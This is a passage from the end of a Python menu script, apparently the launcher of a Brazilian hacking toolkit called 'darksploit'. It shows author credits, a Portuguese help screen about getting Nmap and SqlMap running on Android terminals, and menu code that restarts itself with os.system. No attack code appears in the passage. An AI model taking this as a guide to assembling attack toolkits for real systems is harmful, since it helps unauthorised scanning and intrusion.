	print("| Coder: Tio Dark | Telegram: @SrRooting |")
	print("| Mind :    Supremo, Cyber, CTO_Break    |")
	print("| Team :      Dark Security Brazil       |")
	print("##########################################")
	time.sleep(1)
	print("Website: https://darksecuritybrazil.blogspot.com.br/")
	time.sleep(1)
	input("\nAperte Enter para Voltar ao Menu...")
	os.system('python3 darksploit.py')
elif op == '08':
	os.system('clear')
	os.system('figlet -f standard "Help"')
	print('''
[!] TODOS SCRIPT QUE VOCÊ TEM POR FORA, COLOCA NA PASTA /BIN/ PARA SER EXECUTADO DE QUALQUER LUGAR !!
[!] NO ANDROID VAI TER ALGUNS ERROS !!
[!] ESTÁ É A PRIMEIRA VERSÃO DO SCRIPT, PODE TER BUGS !!
[!] TENHA ROOT PARA DETERMINADAS OPÇÕES !!
[!] TALVEZ O NMAP NÃO PEGUE NO GNUROOT, MAS NO TERMUX ELE PEGAR TRANQUILO !!
[!] NÃO MUDE O NOME DO SCRIPT, POIS VOCÊ TERÁ PROBLEMAS NA EXEC !!

01: Depedencias não baixa? 
RESPOSTA:  Talvez a sua plataforma não seja compativel com alguns scripts.
RESPOSTA:  Ou sua conexão está ruim.

02: O Nmap não funciona?
RESPOSTA: Você tem que ter root para determinadas opções.
RESPOSTA: Tem que dar a permissão.
RESPOSTA: Talvez o nmap não esteja na pasta /usr/share/nmap

03: O Código está cheio de erros
RESPOSTA: Execute o script com python3.

04: O SqlMap não funciona
RESPOSTA: Tem que mover o script dele para a pasta /bin/.


[#########################################################]
      REPORTE OS ERROS PARA NÓS: sr.rooting@gmail.com
[#########################################################]

''')
	input("\nAperte Enter para Voltar ao Menu...")
	os.system('python3 darksploit.py')
elif op == '09':
	os.system("clear")
	print("Saindo...")
	time.sleep(3)
	os.system("clear")

else:
	print("Opção {} invalida.".format(op))
	time.sleep(3)
	print("Voltando...")
	time.sleep(1)
	os.system("python3 darksploit.py")
